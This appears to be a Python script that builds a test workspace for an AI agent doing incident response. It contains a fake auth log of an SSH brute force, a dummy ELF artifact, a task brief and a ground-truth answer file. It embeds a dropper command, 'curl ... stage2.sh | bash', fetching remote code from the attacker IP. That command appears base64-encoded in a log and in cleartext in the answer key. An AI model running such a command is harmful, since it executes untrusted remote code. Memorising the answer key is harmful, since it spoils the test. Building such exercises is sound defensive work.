import os
import random
import base64
import hashlib

random.seed(42)

workspace = "/workspace"
os.makedirs(workspace, exist_ok=True)

# ─── Directory Structure (distractors) ───────────────────────────────────────
dirs = [
    "incident/logs",
    "incident/artifacts",
    "incident/network",
    "ops/configs",
    "ops/backups",
    "ops/reports",
    "sys/cron_archive",
    "sys/service_configs",
    "dev/deploys",
    "dev/patches",
    "archive/q1",
    "archive/q2",
]
for d in dirs:
    os.makedirs(os.path.join(workspace, d), exist_ok=True)

# ─── Distractor Files ─────────────────────────────────────────────────────────
distractors = {
    "ops/configs/nginx.conf": "server { listen 80; server_name txn.internal; }",
    "ops/configs/postgres.conf": "max_connections = 200\nshared_buffers = 256MB",
    "ops/backups/db_backup_20240101.sql.gz.md5": "d41d8cd98f00b204e9800998ecf8427e",
    "ops/reports/monthly_uptime.csv": "date,uptime_pct\n2024-01,99.91\n2024-02,99.87",
    "sys/cron_archive/old_crontab.bak": "0 3 * * * /usr/bin/pg_dump txndb > /backups/daily.sql",
    "sys/service_configs/txn-processor.service": "[Unit]\nDescription=Transaction Processor\n[Service]\nExecStart=/usr/sbin/txn-proc\n[Install]\nWantedBy=multi-user.target",
    "sys/service_configs/monitor.service": "[Unit]\nDescription=Health Monitor\n[Service]\nExecStart=/usr/sbin/healthd\n[Install]\nWantedBy=multi-user.target",
    "dev/deploys/deploy_v2.3.1.log": "2024-03-10 02:15:00 UTC - Deployed txn-processor v2.3.1\nStatus: SUCCESS",
    "dev/patches/patch_cve_2024_001.diff": "--- a/src/auth.c\n+++ b/src/auth.c\n@@ -45,7 +45,7 @@\n- if (len > 512)\n+ if (len > 256)",
    "archive/q1/q1_incidents.txt": "2024-01-12: False positive alert on port scan from internal scanner 10.0.0.5\n2024-02-03: Routine maintenance window",
    "archive/q2/q2_changes.txt": "2024-04-01: Upgraded OpenSSL\n2024-05-10: Rotated service credentials",
    "incident/network/baseline_ports.txt": "Baseline open ports:\ntcp 22 (sshd)\ntcp 5432 (postgres)\ntcp 8080 (txn-api)",
}
for path, content in distractors.items():
    full = os.path.join(workspace, path)
    with open(full, "w") as f:
        f.write(content)

# ─── THE PROBLEM: Suspicious Auth Log ────────────────────────────────────────
# This is the main log the agent must analyze.
# It contains: multiple failed SSH attempts from attacker IPs, one dominant attacker IP,
# and a base64-encoded payload stub embedded in a POST body log line.

ATTACKER_IP = "185.220.101.47"
DECOY_IPS = ["10.0.0.5", "192.168.1.100", "172.16.0.1"]

# The base64 payload encodes a fake dropper command - agent must decode it
PAYLOAD_CLEARTEXT = b"curl -fsSL http://185.220.101.47/stage2.sh | bash"
PAYLOAD_B64 = base64.b64encode(PAYLOAD_CLEARTEXT).decode()

log_lines = [
    "Mar 15 03:12:01 txnhost sshd[1842]: Failed password for invalid user admin from 10.0.0.5 port 54321 ssh2",
    "Mar 15 03:12:44 txnhost sshd[1843]: Failed password for root from 185.220.101.47 port 39210 ssh2",
    "Mar 15 03:12:46 txnhost sshd[1844]: Failed password for root from 185.220.101.47 port 39211 ssh2",
    "Mar 15 03:12:48 txnhost sshd[1845]: Failed password for root from 185.220.101.47 port 39212 ssh2",
    "Mar 15 03:12:50 txnhost sshd[1846]: Failed password for ubuntu from 185.220.101.47 port 39213 ssh2",
    "Mar 15 03:12:52 txnhost sshd[1847]: Failed password for postgres from 185.220.101.47 port 39214 ssh2",
    "Mar 15 03:13:01 txnhost sshd[1848]: Failed password for deploy from 185.220.101.47 port 39215 ssh2",
    "Mar 15 03:13:15 txnhost sshd[1849]: Accepted publickey for deploy from 185.220.101.47 port 39220 ssh2",
    "Mar 15 03:13:16 txnhost sshd[1849]: pam_unix(sshd:session): session opened for user deploy by (uid=0)",
    "Mar 15 03:14:02 txnhost sudo[1901]: deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
    "Mar 15 03:14:45 txnhost kernel: [UFW BLOCK] IN=eth0 OUT= SRC=172.16.0.1 DST=10.0.1.50 PROTO=TCP",
    f"Mar 15 03:15:03 txnhost txn-api[2001]: POST /api/transfer HTTP/1.1 Body(b64): {PAYLOAD_B64}",
    "Mar 15 03:15:10 txnhost cron[2010]: (root) CMD (/tmp/.hidden_task.sh)",
    "Mar 15 03:15:45 txnhost sshd[2050]: Failed password for root from 192.168.1.100 port 22100 ssh2",
    "Mar 15 03:16:01 txnhost kernel: Out of memory: Kill process 2101 (java) score 800",
    "Mar 15 03:16:30 txnhost sshd[2080]: Failed password for root from 185.220.101.47 port 39230 ssh2",
    "Mar 15 03:17:00 txnhost sshd[2081]: Failed password for root from 185.220.101.47 port 39231 ssh2",
]

log_content = "\n".join(log_lines) + "\n"
with open(os.path.join(workspace, "incident/logs/auth_anomaly.log"), "w") as f:
    f.write(log_content)

# ─── THE PROBLEM: Suspicious Binary Artifact ─────────────────────────────────
# A fake malicious binary placed in /tmp (as found by the responder)
artifact_content = b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 + b"\x02\x00" + b"\xde\xad\xbe\xef" * 50
artifact_path = "/tmp/txn_update"
with open(artifact_path, "wb") as f:
    f.write(artifact_content)

# Record expected hash for eval
artifact_hash = hashlib.sha256(artifact_content).hexdigest()
with open(os.path.join(workspace, "incident/artifacts/expected_artifact_hash.txt"), "w") as f:
    f.write(f"sha256:{artifact_hash}\n")
    f.write(f"original_path:/tmp/txn_update\n")

# ─── Task brief (non-technical, no hints) ────────────────────────────────────
brief = """SECURITY ESCALATION - REF: INC-2024-0315

From: SOC Tier 1
To: Incident Responder
Priority: P1

Our transaction processing server (txnhost) has shown anomalous activity tonight.
Relevant files are in the incident/ directory.

A suspicious file was found at /tmp/txn_update.

Please:
1. Identify the primary threat actor IP from the log evidence.
2. Decode any obfuscated payloads found in the logs.
3. Preserve the suspicious artifact forensically before any remediation.
4. Block the threat actor at the network level and make it survive reboots.
5. Produce a remediation_log.txt documenting all actions taken.

Deliverables:
- remediation_log.txt (at workspace root)
- Quarantined artifact at /root/quarantine/txn_update.vir
- Firewall rules saved to /etc/iptables/rules.v4
"""
with open(os.path.join(workspace, "ESCALATION_BRIEF.txt"), "w") as f:
    f.write(brief)

# Write the expected attacker IP and payload for eval reference (hidden from agent)
with open(os.path.join(workspace, "incident/artifacts/.eval_ground_truth.txt"), "w") as f:
    f.write(f"attacker_ip:{ATTACKER_IP}\n")
    f.write(f"payload_b64:{PAYLOAD_B64}\n")
    f.write(f"payload_decoded:{PAYLOAD_CLEARTEXT.decode()}\n")
    f.write(f"artifact_sha256:{artifact_hash}\n")

print("Workspace generated successfully.")
print(f"Attacker IP: {ATTACKER_IP}")
print(f"Payload B64: {PAYLOAD_B64}")
print(f"Artifact SHA256: {artifact_hash}")